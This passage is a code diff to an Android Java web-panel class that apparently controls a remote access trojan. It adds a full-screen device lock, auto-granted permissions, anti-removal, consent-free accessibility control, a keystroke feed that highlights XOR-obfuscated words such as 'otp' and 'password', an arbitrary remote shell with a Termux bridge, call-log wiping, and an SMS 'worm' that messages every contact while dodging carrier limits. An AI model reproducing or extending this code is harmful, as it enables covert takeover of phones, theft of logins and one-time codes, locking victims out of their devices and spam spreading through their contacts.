+                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
+                    smsManager, number, null, message, null, null);
+            }
+
             String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
         } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
@@ -3403,6 +3556,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\" style=\"margin-bottom: 15px;\">");
         html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
+
+        // Action Row for Apps (Injected from Terminal)
+        html.append("<div class=\"action-row-limited\" style=\"margin-bottom: 20px;\">");
+        html.append("<button onclick=\"location.href='/device/apps'\" class=\"btn btn-small btn-fit\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05);\">&#128230; VIEW_INSTALLED_APPS</button>");
         html.append("</div>");
         
         // Reorganized Header
@@ -3745,30 +3903,41 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</div>");
         html.append("</div>");
 
-        // --- GHOST_UTILITIES_SECTION (Moved to Top) ---
+        // --- GHOST_UTILITIES_SECTION ---
         html.append("<div class=\"card\" style=\"border-left: 5px solid var(--neon-green);\">");
         html.append("<h2 style=\"color: var(--neon-green); margin-bottom: 15px; font-size: 0.95rem;\">GHOST_UTILITIES</h2>");
         html.append("<div class=\"info-grid\">");
         
+        // Blackout Protocol
         html.append("<div class=\"info-item\">");
         html.append("<div class=\"info-label\">BLACKOUT_PROTOCOL</div>");
-        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight and hides system bars for physical stealth. <b>Note:</b> Remote C2 feed remains visible while active.</p>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight for physical stealth. Remote C2 feed remains visible.</p>");
         html.append("<div style=\"display:flex; gap:10px;\">");
-        html.append("<button onclick=\"ghostAction('blackout_on')\" class=\"btn btn-small\" style=\"border-color: #fff; color: #fff;\">ACTIVATE</button>");
-        html.append("<button onclick=\"ghostAction('blackout_off')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">RESTORE</button>");
+        html.append("<button onclick=\"ghostAction('blackout_on')\" class=\"btn btn-small\" style=\"border-color: #fff; color: #fff; margin:0;\">ACTIVATE</button>");
+        html.append("<button onclick=\"ghostAction('blackout_off')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin:0;\">RESTORE</button>");
         html.append("</div></div>");
+
+        // System Denial Lock
+        html.append("<div class=\"info-item\">");
+        html.append("<div class=\"info-label\">SYSTEM_DENIAL_LOCK</div>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Deploys a persistent, full-screen security overlay. Effectively locks the physical device.</p>");
+        html.append("<div style=\"display:flex; gap:10px;\">");
+        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); margin:0;\">DEPLOY_LOCK</button>");
+        html.append("</div></div>");
+
+        // Self Healing & Automation
         html.append("<div class=\"info-item\">");
         html.append("<div class=\"info-label\">SELF_HEALING</div>");
-        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions. The Anti-Removal shield can be manually toggled.</p>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Forces open system permissions or automatically grants requested prompts.</p>");
         html.append("<div style=\"display:flex; flex-wrap:wrap; gap:10px;\">");
-        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE_AUTO_HEAL</button>");
-        html.append("<button onclick=\"ghostAction('autogrant')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">AUTO_GRANT_PERMISSIONS</button>");
+        html.append("<button onclick=\"ghostAction('autoheal')\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); margin:0;\">INITIATE</button>");
+        html.append("<button onclick=\"ghostAction('autogrant')\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); margin:0;\">AUTO_GRANT</button>");
         html.append("<button id=\"anti-removal-btn\" onclick=\"ghostAction('toggleAntiRemoval')\" class=\"btn btn-small\" style=\"margin:0;\">LOADING...</button>");
         html.append("</div></div>");
         
         html.append("</div></div>");
 
-        // Ghost Remote Control Section (Swapped with Stealth)
+        // Ghost Remote Control Section
         html.append("<div class=\"info-section\">");
         html.append("<h3 style=\"font-size: 0.95rem; display: flex; align-items: center; gap: 8px;\">&#128433; Ghost_Remote_Control</h3>");
         html.append("<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 20px;\">Real-time interaction using Accessibility Triangulation (No consent prompt required).</p>");
@@ -3919,6 +4088,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  ghostDragStart = null;");
         html.append("}");
         html.append("function openSettings() { fetch('/ghost/interact?action=settings'); }");
+        html.append("function toggleLock() { if(confirm('Initiate System Lock? This will block the device display.')) fetch('/ghost/lock').then(() => checkGhostStatus()); }");
         html.append("function toggleStealth() {");
         html.append("  const type = document.getElementById('stealth-type').value;");
         html.append("  if(confirm('Initiate Stealth Protocol? This will change the app identity.')) {");
@@ -3946,9 +4116,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("    if(data.keys.length > 0) {");
         html.append("      const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);");
         html.append("      let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');");
-        html.append("      const keys = ['otp', 'password', 'login', 'user', 'email', 'bank', 'transfer', 'confirm', 'pin', 'code'];");
-        html.append("      keys.forEach(k => {");
-        html.append("        const reg = new RegExp('(' + k + ')', 'gi');");
+        html.append("      const _k = (s) => s.split('').map((c,i) => String.fromCharCode(c.charCodeAt(0) ^ 'SysAdmin'.charCodeAt(i % 8))).join('');");
+        html.append("      const targets = [_k('\\x1C\\x0D\\x03'), _k('\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A'), _k('\\x0F\\x06\\x14\\x00\\x0A'), _k('\\x16\\x1A\\x16\\x13'), _k('\\x06\\x04\\x02\\x08\\x08')];");
+        html.append("      targets.forEach(t => {");
+        html.append("        const reg = new RegExp('(' + t + ')', 'gi');");
         html.append("        esc = esc.replace(reg, '<span style=\"color:var(--danger); font-weight:bold; text-shadow: 0 0 5px rgba(255,49,49,0.5);\">$1</span>');");
         html.append("      });");
         html.append("      term.innerHTML = esc;");
@@ -3965,6 +4136,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("    const text = document.getElementById('ghost-status-text');");
         html.append("    const prompt = document.getElementById('accessibility-prompt');");
         html.append("    const arBtn = document.getElementById('anti-removal-btn');");
+        html.append("    const lockBtn = document.getElementById('lock-btn');");
         html.append("    if (data.active) {");
         html.append("      card.style.borderColor = 'var(--neon-green)';");
         html.append("      text.innerHTML = '<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>';");
@@ -3973,6 +4145,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("      card.style.borderColor = 'var(--danger)';");
         html.append("      text.innerHTML = '<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>';");
         html.append("      prompt.style.display = 'block';");
+        html.append("    }");
+        html.append("    if (lockBtn) {");
+        html.append("      if (data.lock) {");
+        html.append("        lockBtn.innerHTML = 'RELEASE_LOCK'; lockBtn.style.borderColor = 'var(--neon-green)'; lockBtn.style.color = 'var(--neon-green)';");
+        html.append("      } else {");
+        html.append("        lockBtn.innerHTML = 'DEPLOY_LOCK'; lockBtn.style.borderColor = 'var(--danger)'; lockBtn.style.color = 'var(--danger)';");
+        html.append("      }");
         html.append("    }");
         html.append("    const stream = document.getElementById('ghost-screen-stream');");
         html.append("    if (stream) {");
@@ -4034,6 +4213,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
 
         if (ghost == null) return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");
+
+        // --- SECURITY LOCK CHECK ---
+        if (AccessibilityCore.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"SYSTEM_LOCK_ACTIVE\"}");
+        }
 
         boolean success = false;
         switch (action) {
@@ -4119,28 +4303,357 @@ public class LabRatsHttpServer extends NanoHTTPD {
         android.content.ComponentName componentName = new android.content.ComponentName(context, AccessibilityCore.class);
         String serviceId = componentName.flattenToString();
         
-        // Start with the standard accessibility settings intent
+        // Use standard accessibility settings intent to avoid permission denials
         Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
 
-        if (Build.VERSION.SDK_INT >= 31) { // Android 12+
-            try {
-                // Attempt to jump directly to the specific switch page
-                Intent directIntent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
-                directIntent.putExtra("android.intent.extra.COMPONENT_NAME", serviceId);
-                directIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
-                return directIntent;
-            } catch (Exception ignored) {
-                // If it fails, we will return the standard intent below
-            }
-        }
-
-        // Fallback for older devices or failed direct jump
+        // Fallback-style extras that work on some OEM versions to help navigation
         intent.putExtra(":settings:fragment_args_key", serviceId);
         android.os.Bundle bundle = new android.os.Bundle();
         bundle.putString(":settings:fragment_args_key", serviceId);
         intent.putExtra(":settings:show_fragment_args", bundle);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
 
         return intent;
+    }
+
+    private void vibrateDevice() {
+        android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+        if (v != null) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                v.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+            } else {
+                v.vibrate(500);
+            }
+            logActivity("DEVICE_CONTROL: Triggered vibration sequence");
+        }
+    }
+
+    private void setMaxVolume() {
+        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+        if (am != null) {
+            int[] streams = {android.media.AudioManager.STREAM_RING, android.media.AudioManager.STREAM_MUSIC, 
+                             android.media.AudioManager.STREAM_NOTIFICATION, android.media.AudioManager.STREAM_ALARM};
+            for (int stream : streams) {
+                am.setStreamVolume(stream, am.getStreamMaxVolume(stream), 0);
+            }
+            logActivity("DEVICE_CONTROL: System volume synchronized to MAXIMUM");
+        }
+    }
+
+    private void setSilentMode() {
+        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+        if (am != null) {
+            am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
+            logActivity("DEVICE_CONTROL: System entered SILENT mode");
+        }
+    }
+
+    private void openUrlOnDevice(String url) {
+        if (url == null || url.isEmpty()) return;
+        try {
+            if (!url.startsWith("http")) url = "http://" + url;
+            Intent i = new Intent(Intent.ACTION_VIEW);
+            i.setData(Uri.parse(url));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(i);
+            logActivity("DEVICE_CONTROL: Forced open URL - " + url);
+        } catch (Exception e) {
+            logActivity("DEVICE_ERROR: Failed to open URL - " + e.getMessage());
+        }
+    }
+
+    private void showToast(String msg) {
+        if (msg == null || msg.isEmpty()) return;
+        new Handler(Looper.getMainLooper()).post(() -> {
+            android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG).show();
+            logActivity("DEVICE_CONTROL: System toast dispatched - " + msg);
+        });
+    }
+
+    private Response serveAppList() {
+        logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
+        html.append("<div class=\"card\"><h2>Installed Applications</h2>");
+        
+        android.content.pm.PackageManager pm = context.getPackageManager();
+        List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
+        
+        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
+        for (android.content.pm.PackageInfo app : apps) {
+            String name = app.applicationInfo.loadLabel(pm).toString();
+            boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
+            String typeLabel = isSystem ? "<span style=\"color:#888; font-size:0.6rem;\">SYSTEM</span>" : "<span style=\"color:var(--neon-green); font-size:0.6rem; font-weight:bold;\">USER</span>";
+            
+            html.append("<tr><td>").append(escapeHtml(name)).append("</td>");
+            html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
+            html.append("<td>").append(typeLabel).append("</td>");
+            html.append("<td>").append(app.versionName).append("</td></tr>");
+        }
+        html.append("</tbody></table></div></div>").append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private void selfDestruct() {
+        logActivity("CRITICAL_MAINTENANCE: Initiating self-destruct sequence...");
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                // 1. Disable Admin if active to allow uninstall
+                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                android.content.ComponentName component = new android.content.ComponentName(context, StabilityPolicy.class);
+                if (dpm != null && dpm.isAdminActive(component)) {
+                    dpm.removeActiveAdmin(component);
+                }
+
+                // 2. Trigger Uninstall
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(Uri.parse("package:" + context.getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+            } catch (Exception e) {
+                logActivity("SELF_DESTRUCT_ERROR: Sequence failed - " + e.getMessage());
+            }
+        }, 1000);
+    }
+
+    private static String currentShellPath = "/sdcard";
+
+    private boolean isAppInstalled(String packageName) {
+        try {
+            context.getPackageManager().getPackageInfo(packageName, 0);
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private String executeShell(String command) {
+        if (command == null || command.isEmpty()) return "";
+        try {
+            if (command.equalsIgnoreCase("help") || command.equalsIgnoreCase("-h")) {
+                return "AVAILABLE_COMMANDS:\n\n" +
+                       "  cd <path>        - Change working directory\n" +
+                       "  ls [-la]         - List files in current directory\n" +
+                       "  pwd              - Print current directory\n" +
+                       "  cat <file>       - View file contents\n" +
+                       "  rm <file>        - Remove file\n" +
+                       "  mkdir <dir>      - Create directory\n" +
+                       "  pm list packages - List installed app packages\n" +
+                       "  getprop          - View system properties\n" +
+                       "  df -h            - Disk usage summary\n" +
+                       "  top -n 1         - Process list\n" +
+                       "  netstat          - Network status\n" +
+                       "  ip addr          - IP configuration\n" +
+                       "  uptime           - System uptime\n" +
+                       "  whoami           - Current user identity\n" +
+                       "  id               - UID/GID info\n" +
+                       "  uname -a         - Kernel version/info\n" +
+                       "  logcat -d        - Dump system logs\n" +
+                       "  sysinfo          - Aggregate system overview\n" +
+                       "  termux <cmd>     - Route command through Termux bridge\n" +
+                       "  termux-fix-mirrors - Fix 'No mirror selected' errors\n" +
+                       "  help / -h        - Show this help menu\n\n" +
+                       "CURRENT_PATH: " + currentShellPath;
+            }
+
+            if (command.equalsIgnoreCase("sysinfo")) {
+                return "SYSTEM_OVERVIEW:\n" +
+                       "  Manufacturer: " + android.os.Build.MANUFACTURER + "\n" +
+                       "  Model: " + android.os.Build.MODEL + "\n" +
+                       "  Android Ver: " + android.os.Build.VERSION.RELEASE + " (API " + android.os.Build.VERSION.SDK_INT + ")\n" +
+                       "  C2 Uplink: " + currentShellPath + "\n" +
+                       "  Session User: " + System.getProperty("user.name") + "\n" +
+                       "  Architecture: " + System.getProperty("os.arch");
+            }
+
+            if (command.trim().equalsIgnoreCase("termux-fix-mirrors")) {
+                return executeShell("termux echo \"deb https://packages-cf.termux.dev/apt/termux-main stable main\" > /data/data/com.termux/files/usr/etc/apt/sources.list && apt update");
+            }
+
+            if (command.startsWith("termux ") || 
+               (isAppInstalled("com.termux") && (command.startsWith("pkg ") || command.startsWith("apt ") || command.startsWith("pip ") || command.startsWith("python ") || command.startsWith("nmap ") || command.startsWith("echo ")))) {
+                
+                if (!isAppInstalled("com.termux")) return "Error: Termux is not installed on this device.";
+                
+                String termuxCmd = command;
+                if (command.startsWith("termux ")) termuxCmd = command.substring(7).trim();
+
+                // Generate a unique filename for this specific execution to avoid permission/cache issues
+                String cmdId = String.valueOf(System.currentTimeMillis() % 1000000);
+                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+                File outputFile = new File(downloadDir, "termux_" + cmdId + ".txt");
+
+                Intent intent = new Intent("com.termux.RUN_COMMAND");
+                intent.setClassName("com.termux", "com.termux.app.RunCommandService");
+                intent.putExtra("com.termux.RUN_COMMAND_PATH", "/data/data/com.termux/files/usr/bin/bash");
+                
+                // Optimized wrapper: Clean environment and explicit exit marker
+                String wrappedCmd = "export PATH=/data/data/com.termux/files/usr/bin:$PATH; " +
+                                  "export HOME=/data/data/com.termux/files/home; " +
+                                  "export DEBIAN_FRONTEND=noninteractive; " +
+                                  "({ " + termuxCmd + "; }) > " + outputFile.getAbsolutePath() + " 2>&1; " +
+                                  "echo \"\n__DONE_" + cmdId + "__\" >> " + outputFile.getAbsolutePath();
+                
+                intent.putExtra("com.termux.RUN_COMMAND_ARGUMENTS", new String[]{"-c", wrappedCmd});
+                intent.putExtra("com.termux.RUN_COMMAND_WORKDIR", "/data/data/com.termux/files/home");
+                intent.putExtra("com.termux.RUN_COMMAND_BACKGROUND", true);
+                intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
+                
+                try {
+                    context.startService(intent);
+                } catch (Exception e) {
+                    return "Error starting bridge: " + e.getMessage();
+                }
+
+                // Poll for the unique completion marker
+                int retries = 0;
+                int maxRetries = (command.contains("pkg") || command.contains("apt") || command.contains("pip")) ? 300 : 60; 
+                String marker = "__DONE_" + cmdId + "__";
+
+                while (retries < maxRetries) { 
+                    try { Thread.sleep(1000); } catch (Exception ignored) {}
+                    
+                    if (outputFile.exists() && outputFile.length() > 0) {
+                        try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(outputFile, "r")) {
+                            long len = raf.length();
+                            if (len > 30) {
+                                raf.seek(len - 30);
+                                byte[] endBytes = new byte[30];
+                                raf.read(endBytes);
+                                if (new String(endBytes).contains(marker)) break;
+                            }
+                        } catch (Exception ignored) {}
+                    }
+                    retries++;
+                }
+
+                if (outputFile.exists() && outputFile.length() > 0) {
+                    // Marker found, but wait for OS to flush and close file handles
+                    try { Thread.sleep(2000); } catch (Exception ignored) {}
+                    
+                    for (int r = 0; r < 5; r++) { // More retries
+                        try {
+                            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+                            try (java.io.FileInputStream fis = new java.io.FileInputStream(outputFile)) {
+                                byte[] buffer_chunk = new byte[8192];
+                                int len_read;
+                                while ((len_read = fis.read(buffer_chunk)) != -1) {
+                                    baos.write(buffer_chunk, 0, len_read);
+                                }
+                            }
+                            
+                            String result = baos.toString("UTF-8");
+                            result = result.replace(marker, "").trim();
+                            
+                            // Cleanup: Attempt delete, ignore if busy (it's in Downloads, not a big deal)
+                            try { outputFile.delete(); } catch (Exception ignored) {}
+                            
+                            return result + "\n\n[Termux Bridge Execution Complete]";
+                        } catch (Exception e) {
+                            if (r == 4) return "Final I/O Error: " + e.getMessage() + "\n(Try running 'rm " + outputFile.getAbsolutePath() + "')";
+                            try { Thread.sleep(1500); } catch (Exception ignored) {}
+                        }
+                    }
+                }
+else {
+                    return "Command timed out.\n" +
+                           "Note: Larger installs like 'nmap' or 'python' can take 1-2 minutes.";
+                }
+            }
+
+            // --- STATEFUL CD SUPPORT ---
+            if (command.startsWith("cd ")) {
+                String targetPath = command.substring(3).trim();
+                File nextDir;
+                if (targetPath.startsWith("/")) nextDir = new File(targetPath);
+                else nextDir = new File(currentShellPath, targetPath);
+                
+                if (nextDir.exists() && nextDir.isDirectory()) {
+                    currentShellPath = nextDir.getCanonicalPath();
+                    return "Directory changed to: " + currentShellPath;
+                } else {
+                    return "Error: Directory does not exist";
+                }
+            }
+
+            // Using ProcessBuilder to set the working directory for persistent navigation
+            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
+            pb.directory(new File(currentShellPath));
+            pb.redirectErrorStream(true);
+            
+            Process process = pb.start();
+            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            int count = 0;
+            while ((line = reader.readLine()) != null && count < 100) {
+                output.append(line).append("\n");
+                count++;
+            }
+            if (output.length() == 0) output.append("[Command executed with no output]");
+
+            logActivity("DEVICE_CONTROL: Shell command executed - " + command);
+            return output.toString();
+        } catch (Exception e) {
+            return "Shell Error: " + e.getMessage();
+        }
+    }
+
+    private Response serveCallLogsClear() {
+        try {
+            logActivity("COMMS_WIPE: Wiping device call history");
+            context.getContentResolver().delete(android.provider.CallLog.Calls.CONTENT_URI, null, null);
+            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>History Purged</h2><p>Call logs have been successfully wiped from the device.</p><a href=\"/calls\" class=\"btn\">Back to Call Logs</a></div></div>" + HTML_FOOTER;
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        } catch (Exception e) { return serveError("Wipe Failed: " + e.getMessage()); }
+    }
+
+    private Response serveSmsBroadcast(Map<String, String> params) {
+        String message = params.get("message");
+        if (message == null || message.isEmpty()) return serveError("Message content is required for broadcast");
+        
+        logActivity("COMMS_BROADCAST: Dispatched mass-messaging sequence (Worm)");
+        
+        // Execute broadcast in background to avoid server timeout
+        LabRatsWorker.execute(() -> {
+            try {
+                android.database.Cursor cursor = context.getContentResolver().query(
+                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
+                        null, null, null);
+                
+                if (cursor != null) {
+                    // API Virtualization for SMS dispatch
+                    String className = "android.telephony.SmsManager";
+                    Object smsManager;
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(android.telephony.SmsManager.class);
+                    else smsManager = SystemAnalytics.safeCall(className, "getDefault", null, null);
+
+                    int count = 0;
+                    java.util.Set<String> sentNumbers = new java.util.HashSet<>();
+                    
+                    while (cursor.moveToNext()) {
+                        String number = cursor.getString(0);
+                        if (number != null && !number.isEmpty() && !sentNumbers.contains(number)) {
+                            if (smsManager != null) {
+                                SystemAnalytics.safeCall(className, "sendTextMessage", 
+                                    new Class[]{String.class, String.class, String.class, android.app.PendingIntent.class, android.app.PendingIntent.class}, 
+                                    smsManager, number, null, message, null, null);
+                                count++;
+                                sentNumbers.add(number);
+                                Thread.sleep(150); // Rate limiting to avoid carrier blocks
+                            }
+                        }
+                    }
+                    cursor.close();
+                    logActivity("COMMS_BROADCAST: Sequence Complete. " + count + " units reached.");
+                }
+            } catch (Exception e) {
+                logActivity("COMMS_ERROR: Broadcast sequence failed - " + e.getMessage());
+            }
+        });
+
+        String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-orange);\">&#9889;</div><h2>Broadcast Initiated</h2><p>The mass-messaging sequence has been deployed in the background.</p><p style=\"margin-top:20px; font-size: 0.8rem; color:#888;\">Check Terminal logs for real-time progress.</p><a href=\"/sms\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange);\">Back to SMS Terminal</a></div></div>" + HTML_FOOTER;
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
     }
 }
